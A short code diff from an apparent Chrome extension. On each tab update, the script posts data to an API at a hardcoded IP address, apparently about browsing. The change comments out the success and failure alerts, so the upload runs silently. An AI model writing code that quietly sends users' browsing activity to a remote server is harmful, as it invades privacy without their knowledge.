@@ -24,10 +24,10 @@ chrome.tabs.onUpdated.addListener(function (tabId , info) {
 	        url: "https://39.108.160.157/api/Browsing/",
 	        data: postdata,
 	        success: function (data) {
-		        alert("save success");
+		        //alert("save success");
 	        },
 	        error: function (xhr, ajaxOptions, thrownError) {
-				alert("save fail");
+				//alert("save fail");
 	        }
         });
 	});	
